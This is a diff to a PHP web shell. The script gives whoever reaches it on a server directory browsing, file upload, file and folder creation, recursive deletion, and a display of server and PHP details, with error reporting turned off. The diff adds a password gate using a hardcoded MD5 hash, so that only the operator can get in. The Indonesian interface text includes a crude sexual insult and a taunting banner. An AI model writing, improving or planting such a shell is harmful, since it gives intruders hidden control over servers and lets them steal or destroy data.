@@ -1,5 +1,28 @@
 <?php
+session_start();
 error_reporting(0);
+
+// Ganti hash MD5 ini dengan milik kamu kalau perlu
+$hashed_password = "dc2a5229c7d70313bc7128c13ac5702a";
+
+// Jika belum login, tampilkan form login
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    if (isset($_POST['pass'])) {
+        if (md5($_POST['pass']) === $hashed_password) {
+            $_SESSION['loggedin'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            echo "<p style='color:red'>Kontolmu kecil jadinya gak masuk lubangnya!</p>";
+        }
+    }
+    echo "<form method='post'>
+        <h3>Masukkan kata kata ketika mau ngentod:</h3>
+        <input type='password' name='pass'>
+        <input type='submit' value='Login'>
+    </form>";
+    exit;
+}
 
 // Fungsi hapus rekursif
 function deleteRecursive($target) {
@@ -55,7 +78,7 @@ if (isset($_FILES['upload']) && $_FILES['upload']['error'] == 0) {
 
 $files = scandir('.');
 
-// Tampilkan info server
+// Info Server
 echo "<pre>";
 echo "Informasi Server Yang Lagi di SEPONG Asep\n";
 echo "Server: " . $_SERVER['HTTP_HOST'] . " (" . $_SERVER['SERVER_ADDR'] . ")\n";
@@ -63,7 +86,7 @@ echo "PHP Uname: " . php_uname() . "\n";
 echo "Versi PHP: " . phpversion() . "\n";
 echo "Folder Saat Ini: $path\n";
 
-// Breadcrumb path
+// Breadcrumb
 $parts = preg_split('~[\\\\/]~', $path);
 $cumulative = '';
 $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
@@ -78,25 +101,23 @@ foreach ($parts as $i => $part) {
 }
 echo "</pre>";
 
-// Form Upload
+// Upload & Buat
 echo "<form method='post' enctype='multipart/form-data'>
     <b>Upload File:</b> <input type='file' name='upload'>
     <input type='submit' value='Upload'>
 </form>";
 
-// Form Buat File
 echo "<form method='post'>
     <b>Buat File Baru:</b> <input type='text' name='newfile'>
     <input type='submit' value='Buat'>
 </form>";
 
-// Form Buat Folder
 echo "<form method='post'>
     <b>Buat Folder Baru:</b> <input type='text' name='newfolder'>
     <input type='submit' value='Buat'>
 </form>";
 
-// Tabel file/folder
+// Tabel file
 echo "<style>
     table { border-collapse: collapse; width: 100%; }
     th, td { border: 1px solid #ccc; padding: 6px 10px; text-align: left; }
